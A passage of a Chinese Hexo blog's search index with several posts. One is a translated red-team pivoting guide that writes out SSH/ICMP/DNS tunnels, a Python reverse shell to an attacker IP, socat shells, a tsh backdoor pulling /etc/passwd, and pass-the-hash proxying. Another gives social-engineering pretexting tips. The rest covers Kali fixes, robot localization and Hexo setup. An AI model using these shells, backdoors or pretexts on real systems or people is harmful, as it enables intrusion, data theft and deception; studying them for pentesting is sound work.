        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Udacity CS373:无人驾驶汽车编程学习笔记一]]></title>
    <url>%2F2017%2F12%2F14%2Fcs373-1%2F</url>
    <content type="text"><![CDATA[一：定位蒙特卡罗定位是感知和运动的循环，每次感知都会获得信息，每次运动都会丢失信息，感知函数利用了贝叶斯规则，运动函数利用了全概率定理。基于一维的蒙特卡罗定位程序如下：1234567891011121314151617181920212223242526272829303132p = [0, 1, 0, 0, 0)world = ['green', 'red', 'red', 'green', 'green']measurements = ['red', 'green']motions = [1, 1]pHit = 0.6pMiss = 0.2pExact = 0.8pOvershoot = 0.1pUndershoot = 0.1def sense(p, Z): q = [] for i in range(len(p)): hit = (Z == world[i]) q.append(p[i] * (hit * pHit + (1-hit) * pMiss)) s = sum(q) for i in range (len(p)): q[i] = q[i]/s return qdef move(p, U): q= [] for i in range(len(p)): s = pExact * p[(i-U) % len(p)] s = s + pOvershoot * p[(i-U-1) % len(p)] s = s + pUndershoot * p[(i-U+1) % len(p)] q.append(s) return qfor k in range(len(measurements)): p = sense(p, measurements[k]) p = move(p, motions[k]) print p]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>CS373</tag>
        <tag>无人驾驶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个Red Team成员的跳板(pivoting)指南]]></title>
    <url>%2F2017%2F12%2F10%2Fpivoting-guide%2F</url>
    <content type="text"><![CDATA[本文翻译自https://artkond.com/2017/03/23/pivoting-guide/ ，正文如下： 渗透测试人员经常通过逻辑网络边界来访问客户的关键基础设施。常见的情况包括在成功的外围攻破之后，将攻击发展到内部网络，或者在危及组织内的主机之后访问初始的不可路由的网段。跳板是red team/pentest参与过程中使用的一系列技术，它们利用攻击者控制的主机作为逻辑网络进行跳跃，旨在扩大网络可视性。在这篇文章中，我将介绍常用的跳板技术和可用的工具。 以公有IP为目标一个普遍的情况。比方说，你可以从互联网上找到一个网络应用程序中的RCE漏洞。你上传了一个shell，并想把你的攻击发展到内部网络。请注意，在这种特定情况下，你应该能够绑定受感染主机上的端口，并且应该可以从外部网络访问这些端口。 SSH端口转发设法找到在主机上运行的SSH服务的凭据？很好！连接到主机，如下所示：1ssh username@host -D 1080 这将在攻击者一侧产生一个socks服务器（ssh客户端）。欢迎来到内部网络;）也可以将一个特定的端口转发给特定的主机。假设你需要访问主机192.168.1.1的内部网络中的SMB共享。1ssh username@host -L 445:192.168.1.1:445 这样，端口445就会被打开在攻击者一侧。请注意，要绑定特权端口（例如445），你将需要在你的计算机上拥有root权限。 通过SSH的VPN由于openssh 4.3版本，可以通过已建立的ssh通道来传输第3层网络流量。这比典型的tcp隧道有优势，因为你在控制ip流量。因此，例如，你可以使用nmap执行SYN扫描，并直接使用你的工具，而无需使用proxychains或其他代理工具。它是通过在客户端和服务器端创建tun设备并通过ssh连接在它们之间传输数据完成的。这很简单，但是由于tun设备的创建是一个特权操作，所以在两台机器上都需要root。这些行应该出现在/etc/ssh/sshd_config文件（服务器端）中：12PermitRootLogin yesPermitTunnel yes 客户端上的以下命令将在客户端和服务器上创建一对tun设备：1ssh username@server -w any:any 标志-w接受用冒号分隔的每一侧的tun设备的数量。可以显式设置 —— -w 0:0，也可以使用-w any:any语法来获取下一个可用的tun设备。tun设备之间的隧道已启用，但接口尚未配置。配置客户端的示例：1ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 服务器端：1ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 在服务器上启用IP转发和NAT：12echo 1 &gt; /proc/sys/net/ipv4/ip_forwardiptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE 现在，你可以将对等主机1.1.1.1设置为你的默认网关，或通过它路由到特定的主机/网络：1route add -net 10.0.0.0/16 gw 1.1.1.1 在这个例子中，服务器的外部网络接口是eth0，两端新创建的tun设备是tun0。 3proxy在这里获取 - https://github.com/z3APA3A/3proxy/releases 。这个工具适用于多个平台。有预编译的Windows二进制文件。至于Linux，你将需要自己编译它，这是一个很简单的事，只是./configure &amp;&amp; make :)这个工具是代理世界中的瑞士军刀，所以它有很多的功能。我通常使用它作为socks代理或端口转发。这个工具从配置文件中获得所有选项。运行它：13proxy.exe config_file 或者如果你在Linux系统上：1./3proxy config_file 要在端口1080上运行3proxy作为socks5代理，请在config中放置以下行：1socks -p1080 现在可以通过这个代理来隧道化你的渗透测试工具，以发展内部网络的攻击。这只是一个不太安全的基本设置。你可以使用选项来放置身份验证和/或基于IP的访问控制规则。去检查完整的手册在这里 - https://3proxy.ru/howtoe.asp 。要对特定端口进行隧道使用，请用以下语法：1tcppm &lt;localport&gt; &lt;targethost&gt; &lt;targetport&gt; NAT场景这是我在交战中遇到的最常见的情况。到目标的流量正在转发到逐个端口的基础上。这意味着除了端口转发规则以外的所有端口都不能从外部访问。一种可能的解决方案是启动反向连接。下面介绍的工具将帮助你做到这一点。 SSH反向端口转发/w 3proxy这个跳板设置看起来像这样：在目标服务器上使用以下配置运行3proxy服务：1socks -p31337 在接收方（攻击者的机器）上创建一个单独的用户。1adduser sshproxy 这个用户必须是低权限的，不应该有shell权限。毕竟，你不想被反向渗透，你呢？:)编辑/etc/passwd并将shell切换到/bin/false。它应该是这样的：1234root:x:0:0:root:/root:/bin/bash...sshproxy:x:1000:1001:,,,:/home/sshproxy:/bin/false... 现在使用-R标志连接到新创建的用户的服务器。Linux系统：1ssh sshproxy@your_server -R 31337:127.0.0.1:31337 对于Windows，你将需要首先上传plink.exe。这是一个putty的控制台版本。运行它：1plink.exe sshproxy@your_server -R 31337:127.0.0.1:31337 -R标志允许你绑定服务器端的端口。到此端口的所有连接都将被中继到客户端上的指定端口。这样我们就可以在客户端运行3proxy socks服务（受感染的机器）并通过ssh-R标志访问攻击者主机上的这个端口。 Rpivot这是我最喜欢穿越NAT连接的方法。Rpivot是一个反向socks代理工具，可以让你通过socks代理隧道化流量。它连接回你的机器，并绑定一个socks代理。它的工作方式与ssh -D很像，但方向相反。服务器端：1python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0 客户端：1python client.py --server-ip &lt;ip&gt; --server-port 9999 结果，一个socks4代理服务将被绑定在服务器端的1080端口。 从内部网络泄漏这是另一种情况。比方说，你的社会工程学表演最终让你进入了内部网络。你的连接受限，并且能够在受感染的计算机上执行命令。当然，如果互联网直接路由，而不是用做防火墙，你可以凭借任何上述技术。但如果你不那么幸运，还是有办法把你的出路转出来。 ICMP隧道如果icmp流量被允许到外部网络，那么很可能你可以建立一个icmp隧道。缺点是你需要在目标系统上拥有root/administrator权限，因为有必要使用原始套接字。检查这个工具 - http://code.gerade.org/hans/ 。我个人从来没有尝试过在Windows上运行它。它在Linux上非常有效。服务器端命令（攻击者的机器）：1./hans -v -f -s 1.1.1.1 -p P@ssw0rd -v标志是详细的，-f标志在前台运行，-s标志的值是服务器在新创建的tun接口上的ip。客户端：1./hans -f -c &lt;server_ip&gt; -p P@ssw0rd -v 连接成功后，客户端应该可以直接在1.1.1.100处看到：123# ping 1.1.1.100PING 1.1.1.100 (1.1.1.100) 56(84) bytes of data.64 bytes from 1.1.1.100: icmp_seq=1 ttl=65 time=42.9 ms 现在你可以使用这台机器作为进入内部网络的大门。将本机用作默认网关或连接到管理界面（ssh/tsh /web shell）。 DNS隧道如果有任何广域网流量被阻塞，但是外部主机名被解析，那么就有可能通过DNS查询来进行隧道通信。你需要注册一个用于此技术工作的域名。这个手册可能会帮助你设置你的名称服务器。 Iodine如果发生这种情况，并且在服务器上获得了root访问权限，你可以试试iodine。它几乎像hans icmp隧道工具一样工作 - 它创建了一对tun适配器，并将它们之间的数据作为DNS查询进行隧道传输。服务器端：1iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com 客户端：1iodine -f -P P@ssw0rd tunneldomain.com -r 连接成功将在地址1.1.1.2处产生直接的客户端可见性。请注意，这种隧道技术非常慢。你最好的选择是在生成的连接上使用一个压缩的ssh连接：1ssh &lt;user&gt;@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080 Dnscat2Dnscat2通过递归DNS查询建立C＆C通道。这个工具不需要root/administrator权限（在windows和linux上都可以）。它也支持端口转发。服务器端：1ruby ./dnscat2.rb tunneldomain.com 客户端：1./dnscat2 tunneldomain.com 在收到服务器端的连接后，可以使用windows命令查看活动会话：12345dnscat2&gt; windows0 :: main [active] dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*] 1 :: command session (debian) 2 :: sh (debian) [*] 要启动端口转发，请选择带有session -i &lt;num&gt;的命令会话：12345678910dnscat2&gt; session -i 1New window created: 1New window created: 1history_size (session) =&gt; 1000This is a command session!That means you can enter a dnscat2 command such as'ping'! For a full list of clients, try 'help'.command session (debian) 1&gt; 使用listen [lhost:]lport rhost:rport命令转发一个端口：1command session (debian) 1&gt; listen 127.0.0.1:8080 10.0.0.20:80 这将绑定攻击者机器上的8080端口，并将所有连接转发到10.0.0.20:80。 公司的HTTP代理作为一种出路HTTP代理组织的地方为他们的员工访问外部网络应用程序提供了一个良好的渗出机会，因为你有正确的凭据;） Rpivot我已经在NAT穿越部分提到了这个工具。它还支持通过NTLM HTTP代理连接到外部世界。服务器端命令保持不变，使用客户端命令如下：123python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999\--ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\--username Alice --password P@ssw0rd 或者如果你有LM:NT哈希而不是密码：123python client.py --server-ip &lt;rpivot_server_ip&gt;\--server-port 9999 --ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\--username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45 CntlmCntlm是通过NTLM代理运行任何非代理感知程序的首选工具。基本上这个工具对一个代理进行身份验证，并将本地端口绑定到你指定的外部服务。这个端口绑定不需要任何认证，所以你可以直接使用你的工具（例如putty/ssh）。它使用配置文件进行操作。这里有一个准系统配置的例子来转发端口443（这个端口是最有可能被允许通过代理的）：12345Username AlicePassword P@ssw0rdDomain CONTOSO.COMProxy 10.0.0.10:8080Tunnel 2222:&lt;attackers_machine&gt;:443 运行：1cntlm.exe -c config.conf 或者如果你在Linux上：1./cntlm -c config.conf 现在，假设你已经在远程主机的443端口上运行ssh，你可以启动ssh客户端（openssh/putty）并连接到本地端口2222来访问外部机器。 通过HTTP代理的OpenVpnOpenVpn是巨大的，所以它从头开始的配置超出了这篇文章的范围。只需简单提一下 - 它也支持通过NTLM代理的隧道TCP连接。将此行添加到你的配置文件中：1http-proxy &lt;proxy_ip&gt; 8080 &lt;file_with_creds&gt; ntlm 凭证文件应该在不同的行上包含用户名和密码。而且，是的，你需要root。 利用带有proxychains的SOCKS如果你的程序不使用原始套接字（例如，nmap syn-scan），那么很可能你可以使用proxychains来强制你的程序通过socks代理。编辑/etc/proxychains.conf中的代理服务器：12345[ProxyList]# add proxy here ...# meanwile# defaults set to "tor"socks4 127.0.0.1 3128 准备好了，只需在你最喜欢的pwn工具上添加proxychains：1proxychains program_name 与proxychains一起使用的impacket’s psexec.py： DNS与proxychainsProxychains在解析主机名时不遵循socks RFC。它拦截gethostbyname libc调用并通过socks代理隧道化tcp DNS请求。事情是，DNS服务器硬编码到4.2.2.2。你可能需要更改名称服务器以解析内部网络上的名称。一个典型的情况是如果你正在测试Windows环境，将名称服务器更改为域控制器。该设置位于/usr/lib/proxychains3/proxyresolv：123456789101112#!/bin/sh# This script is called by proxychains to resolve DNS names# DNS server used to resolve namesDNS_SERVER=$&#123;PROXYRESOLV_DNS:-4.2.2.2&#125; #change nameserver hereif [ $# = 0 ] ; then echo " usage:" echo " proxyresolv &lt;hostname&gt; " exitfi 美化你的web shell这部分内容与pivoting或tunneling没有直接关系，而是描述了在内部网络发展攻击时简化工作的方法。通常情况下，使用web-shell非常繁琐，特别是在使用需要交互式命令界面的程序时。很可能你会使用一些解决方法来执行简单的任务，比如将密码传递给sudo/su或者只是编辑一个文件。我不是一个折磨自己的狂热爱好者，所以当有一个机会将web-shell升级到一个交互式shell时，我这样做:)我不会介绍像使用bash/perl/python等启动半交互式shell。有很多关于这样做的信息。看看这个反向shell备忘单 - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 。 Python PTY shell从常规的半交互式shell升级。你可以在现有的shell中执行以下命令：1python -c 'import pty; pty.spawn("/bin/bash")' 或者启动反向连接：1234python -c 'import socket,subprocess,os;\s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\s.connect(("&lt;attackers_ip&gt;",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' SocatNetcat的加强版！可是说实话，去检查这个工具的手册man socat，你会惊奇你可以用这个工具做隧道化的工作。除此之外，它可以产生一个完全交互的shell，甚至比前面提到的python-pty更好。缺点是你很可能将不得不在目标服务器上编译/安装这个工具，因为它不是大多数类Unix发行版中的默认工具。 绑定shell设置监听器：1socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane 连接到监听器：1socat FILE:`tty`,raw,echo=0 TCP:&lt;victim_ip&gt;:1337 反向shell：设置监听器：1socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0 连接到攻击者的机器：1socat TCP4:&lt;attackers_ip&gt;:1337 EXEC:bash,pty,stderr,setsid,sigint,sane 终端大小默认情况下，终端的大小是相当小的，当启动top命令或使用文本编辑器编辑文件时你可能会注意到。你可以很容易地改变这个，使用stty -a命令来获得你的常规终端的大小：12$ stty -aspeed 38400 baud; rows 57; columns 211; line = 0; 将所需的尺寸应用到你的socat终端：1$ stty rows 57 cols 211 TshTsh是一个小型的ssh式后门，带有完整的pty终端，并具有文件传输能力。这个工具的占用空间非常小，并且很容易在大多数类Unix系统上编译。从编辑tsh.h文件开始：12345678910111213141516#ifndef _TSH_H#define _TSH_Hchar *secret = "never say never say die";#define SERVER_PORT 22short int server_port = SERVER_PORT;/*#define CONNECT_BACK_HOST "localhost"#define CONNECT_BACK_DELAY 30*/#define GET_FILE 1#define PUT_FILE 2#define RUNSHELL 3#endif /* tsh.h */ 更改secret，指定SERVER_PORT。如果你想反向连接，取消注释并编辑CONNECT_BACK_HOST和CONNECT_BACK_DELAY指令。运行make：12345678910111213141516$ make linux_x64make \ LDFLAGS=" -Xlinker --no-as-needed -lutil" \ DEFS=" -DLINUX" \ tsh tshdmake[1]: Entering directory '/tmp/tsh'gcc -O3 -W -Wall -DLINUX -c pel.cgcc -O3 -W -Wall -DLINUX -c aes.cgcc -O3 -W -Wall -DLINUX -c sha1.cgcc -O3 -W -Wall -DLINUX -c tsh.cgcc -Xlinker --no-as-needed -lutil -o tsh pel.o aes.o sha1.o tsh.ostrip tshgcc -O3 -W -Wall -DLINUX -c tshd.cgcc -Xlinker --no-as-needed -lutil -o tshd pel.o aes.o sha1.o tshd.ostrip tshdmake[1]: Leaving directory '/tmp/tsh' 现在在服务器上运行./tshd。它将开始监听指定的端口。您可以通过执行以下命令连接到它：1./tsh host_ip 如果tsh被编译有反向连接功能，tshd守护进程将尝试连接回攻击者的机器。在攻击者侧启动监听：12$ ./tsh cbWaiting for the server to connect... 用tsh传输文件：12./tsh host_ip get /etc/passwd ../tsh host_ip put /bin/netcat /tmp]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[《欺骗的艺术》读书笔记]]></title>
    <url>%2F2017%2F12%2F05%2Fthe-art-of-deception%2F</url>
    <content type="text"><![CDATA[人的因素是安全过程中最薄弱的环节。 你只要说你是一个写书的或者写电影剧本的，每个人都会对你开绿灯。 把重要的问题掺杂在琐碎的、不合逻辑的问题中间，这样可以给人一种可信的感觉。 不要在得到关键信息后马上结束谈话。再问两三个问题，闲聊几句，然后才说再见。以后，如果受害者记起你曾经问过什么，则极有可能是最后几个问题，其他的通常都忘掉了。 两三样信息可能就足以支撑起一次成功的假冒行为 —— 社交工程师冒用别人的身份。取得职员的名字、他的电话，以及他的职员编号 —— 或许，最好也能得到其经理的名字和电话 —— 这样，即使一个半瓶子醋的社交工程师，也有了足够的信息，使自己在给下一个目标打电话时听起来非常可信。 安全培训需要强调一点：当你有疑虑时，必须确认，确认，再确认。 执法部门的人跟军队里的人一样，从接受训练的第一天起就形成了一个根深蒂固的等级观念。只要社交工程师扮作警官或中尉 —— 级别比跟他谈话的人高 —— 受害者就会拘于一条长时间得来的教训，即“不要质问比你职别高的人”。级别，换个说法，就是特权，尤其是不被级别低的人质问的特权。 每个人都应该明白社交工程师的伎俩：获得尽可能多的与目标有关的信息，再利用这些信息使人相信自己是内部人员。然后一剑封喉。 逆向社交工程学：一种社交工程攻击方式。攻击者建立起这样一个场景：让受害者遇到问题，并向攻击者寻求帮助。逆向社交工程学的另一种表现形式是以其人之道还治其人之身。攻击目标识别出自己受到了攻击，从而利用心理学原理来牵制攻击者，并且从他那里引诱出尽可能多的信息，进而有效的保护目标资产。 新员工最容易成为攻击者的目标。他们认识的人还不多，也不太清楚公司的办事程序，以及什么该做什么不该做。而且，为给人留下良好的第一印象，他们急于表现自己是多么乐于合作与反应迅捷。 第一条原则：除非万不得已，否则不要造访他们的办公室。仅凭着电话中的声音，他们是很难认出你来的，而如果他们不能人称认出你，那就不能逮捕你。]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali持久加密USB安装所遇问题总结]]></title>
    <url>%2F2017%2F12%2F04%2Fkali-live-usb-bug%2F</url>
    <content type="text"><![CDATA[Writing superblocks and filesystem accounting information今天在将Kali安装到U盘上时遇到了上面所示的问题，也可以翻译成“写入超级块和文件系统账户统计信息”，具体情况是当使用mkfs.ext4格式化加密分区时，程序运行到上面所示的地方停止不动，无论等多久都无法完成，其间还会发生U盘挂掉又重连上的情况，使用dmesg命令诊断故障时发现如下错误：123...device descriptor read/8, error -110... 经判断是因为主板无法提供给U盘足够的电量所导致的，因为我的U盘和虚拟机之间是3.0连接的，3.0连接要比2.0连接耗电，所以将U盘和虚拟机之间的连接改为2.0即可解决这个问题。 时间问题安装好Kali并启动之后，会发现Kali的系统时间始终无法和Windows的系统时间保持一致，具体表现如下： 开始时，Windows系统时间准确，启动Kali之后，Kali系统时间错误，将其更新正确之后，关闭Kali，进入Windows，发现Windows系统时间又错误。 出现这种情况的原因是Windows和Linux的时间机制不一样，具体而言，Windows的时间就是硬件BIOS的时间，而Linux的时间则是硬件BIOS加上所在时区的时间。解决方法是，在Kali中执行如下命令：1sudo timedatectl set-local-rtc 1 --adjust-system-clock]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Metasploit中shell中文乱码解决方案]]></title>
    <url>%2F2017%2F12%2F04%2Fmetasploit-luanma%2F</url>
    <content type="text"><![CDATA[有时在Kali Linux中获得了一个Windows shell或者在meterpreter中进入shell后，执行命令可能会出现中文乱码，其原因是Windows和Linux的编码不同，导致Windows中的中文在Linux中无法正常显示。解决方法： 在shell窗口的工具栏选择“编辑”——&gt;“首选项”——&gt;“编码”，选中简体中文的三个编码：GB18030，GB2312，GBK，打勾并退出 接着在“终端”——&gt;“设定字符编码”中选择添加的三个简体中文编码之一即可注意： 这个设置会随着操作系统的重启而失效 设定简体中文编码之后，Linux中的中文字符就会乱码，因为Linux使用UTF-8编码 建议只在需要的时候设定简体中文编码]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Rolling 2017更新后无法启动解决方案]]></title>
    <url>%2F2017%2F11%2F25%2Fkali-update-bug%2F</url>
    <content type="text"><![CDATA[BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)有时更新Kali后重新启动会出现如下显示，并无法进入系统界面1234BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)Enter 'help' for a list of built-in commands.(initramfs) 解决方法： 在此界面输入blkid命令，查看自己的分区号 依据自己的分区号输入fsck -y /dev/sda1，我的分区号是sda1。 输入exit命令退出重启电脑]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Rolling 2017下安装w3af出错解决方案]]></title>
    <url>%2F2017%2F11%2F08%2Fkali-w3af-bug%2F</url>
    <content type="text"><![CDATA[Run error: “‘module’ object has no attribute ‘SSL_ST_INIT’”.”解决方法1：修改/usr/local/lib/python2.7/dist-packages/OpenSSL/SSL.py文件，将下面四行注释掉1234#SSL_ST_INIT = _lib.SSL_ST_INIT#SSL_ST_BEFORE = _lib.SSL_ST_BEFORE#SSL_ST_OK = _lib.SSL_ST_OK#SSL_ST_RENEGOTIATE = _lib.SSL_ST_RENEGOTIATE 解决方法2： 卸载w3af要求的pyOpenSSL版本 1$ pip uninstall pyOpenSSL 安装最新版pyOpenSSL 1$ pip install pyOpenSSL 编辑w3af安装目录中的/w3af/core/controllers/dependency_check/requirements.py文件，将要求的pyOpenSSl版本号改为你安装的最新版，即修改下面这一行代码 1PIPDependency('OpenSSL', 'pyOpenSSL', 'Version of pyOpenSSL you are using') error: command ‘x86_64-linux-gnu-g++’ failed with exit status 1解决方法：使用如下命令安装相关依赖12$ apt-get build-dep python-lxml$ apt-get install libxslt-dev libssl-dev ImportError: No module named webkit启动GUI界面时可能会报此错误，原因是未安装相关模块解决方法：执行如下命令1$ apt-get install python-webkit python-webkit-dev 在Kali下，因为python-webkit，python-webkit-dev不在Kali默认的源中，所以需要执行下面的命令1234567$ wget http://ftp.cn.debian.org/debian/pool/main/p/python-support/python-support_1.0.15_all.deb$ dpkg -i python-support_1.0.15_all.deb$ wget http://ftp.cn.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit_1.1.8-3_amd64.deb$ dpkg -i python-webkit_1.1.8-3_amd64.deb$ apt install python-gtk2-dev$ wget http://ftp.cn.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit-dev_1.1.8-3_all.deb$ dpkg -i python-webkit-dev_1.1.8-3_all.deb 安装过程中可能需要安装相关依赖，可执行如下命令1$ apt --fix-broken install ImportError: No module named gtksourceview2同样，启动GUI时也可能报此错误解决方法：执行如下命令1$ apt-get install python-gtksourceview2]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo初体验]]></title>
    <url>%2F2017%2F06%2F20%2Fhexo-experience%2F</url>
    <content type="text"><![CDATA[Hexo是一个基于Node.js的开源静态博客框架，类似的项目还有基于Ruby的Jekyll，基于Go的Hugo，基于Python的Pelican等等。之所以选择Hexo，主要是因为它不仅使用人数多，而且有中文文档。 安装安装Hexo前，需要安装Node.js和Git，安装Node.js的同时，npm(Node Package Manager)也已经被自动安装了，同时安装程序也自动配置了环境变量。确定安装完成后，可以输入node -v来测试Node.js是否成功安装，输入npm -v来测试npm是否成功安装。npm成功安装后，可使用npm install -g hexo-cli来快速安装Hexo命令行工具。参数-g表示全局安装，npm的包安装分为本地安装（local）和全局安装（global）两种，区别在于： 本地安装 将安装包放在 ./node_modules 下（运行npm时所在的目录） 可以通过 require() 来引入本地安装的包 全局安装 将安装包放在 /usr/local下 可以直接在命令行里使用 关于npm更多的内容请参考npm模块安装机制简介。 更新在博客所在目录执行hexo version即可查看Hexo版本信息，在博客所在目录执行npm update -g即可更新Hexo。 常用命令新建一个网站1hexo init [folder] 如果没有设置folder，Hexo 默认在目前的文件夹建立网站。 新建一篇文章12hexo n [layout] &lt;title&gt;或 hexo new [layout] &lt;title&gt; 如果没有设置layout的话，默认使用 _config.yml 中的default_layout参数代替。如果标题包含空格的话，请使用引号括起来。 生成静态文件12hexo g或 hexo generate 启动服务预览12hexo s或 hexo server 默认情况下，访问网址为：http://localhost:4000/ 。 部署网站12hexo d或 hexo deploy 清除缓存文件(db.json)和已生成的静态文件(public)。1$ hexo clean 在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。 更多目录结构Hexo生成的网站目录结构如下： public：此目录下保存着已经生成的静态文件 scaffolds：此目录下存放Hexo模板，当您新建文章时，Hexo会根据scaffold来建立文件。 source：此目录下存放用户资源 _posts：此目录下存放Markdown格式的源文章 images：此目录下存放相关图片文件 themes：此目录下保存着主题文件 _config.yml：此文件为站点配置文件 最佳实践站点配置文件（_config.yml）中的url字段务必要填写为自己站点的正确网址，否则分享自己站点内文章时会生成错误链接。新建文章（hexo n &lt;title&gt;）时建议使用小写英文作为文件名，此文件名将作为文章链接的一部分，英文中的空格将自动用-替代，文章标题可以在文件中另行设置。和传统的博客一样，建议开启分类（category）和标签（tag）功能，在Hexo中，分类具有顺序性和层次性，也就是说Foo，Bar不等于Bar，Foo，而标签没有顺序和层次。简单来说，分类应该是经过深思熟虑的，而标签则可适文章而决定，分类一般只有几个，而标签可以有一堆。具体而言，可以参考本站点的分类标签设计。 插件Hexo支持许多插件，个人经常使用的插件如下： hexo-deployer-git：为Hexo打造的Git部署插件，适用于将博客部署到GitHub仓库上。 hexo-symbols-count-time：适用于为文章添加字数统计和阅读时长统计，比同类型的hexo-wordcount插件要更好。 hexo-generator-searchdb：适用于为博客添加本地搜索功能。 hexo-generator-feed：适用于为博客添加RSS功能。 使用如下命令即可安装上面提到的所有插件：1npm install hexo-deployer-git hexo-symbols-count-time hexo-generator-searchdb hexo-generator-feed --save 主题安装Hexo后，默认使用的主题为landscape，个人不是很喜欢这个主题，所幸的是Hexo提供更多的第三方主题，个人倾向于使用广为流行的NexT主题。值得注意的是，NexT主题在6.0.0版本之前由iissnan个人维护，其官方仓库为https://github.com/iissnan/hexo-theme-next ，官网为https://theme-next.iissnan.com/ ，在6.0.0版本之后由theme-next组织维护，其官方仓库更改为https://github.com/theme-next/hexo-theme-next ，官网为https://theme-next.org 。这里所介绍的使用方法均以6.0.0版本之后为例。 安装要安装NexT主题，首先要进入Hexo站点目录下，接着执行git clone https://github.com/theme-next/hexo-theme-next themes/next命令，即可将NexT仓库克隆到本地。要启用NexT主题，只需在站点配置文件中找到theme字段，并将其值更改为next即可。 更新要查看正在使用的NexT主题的版本，有如下几种方法： 可直接打开主题配置文件（即站点目录下的/themes/next/_config.yml文件），在其底部version字段即可查看版本号。 在自己站点的底部一般会有Hexo和NexT的版本号 和传统的Git仓库更新一样，进入站点目录下的/themes/next文件夹，执行git pull命令即可从官方仓库拉取最新代码进行更新。如果你使用的是6.0.0之前的版本，现在想要升级到6.0.0之后的版本，可参考NexT主题官方给出的解决方案。 主题配置关于Hexo的更多问题，请参考Hexo官方文档，或YouTube上Hexo系列教程视频；关于NexT主题的更多问题，请参考NexT使用文档；关于如何利用Hexo以及GitHub Pages搭建个人博客的更详细内容，请参考GitHub + Hexo 搭建个人网站详细教程。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
</search>
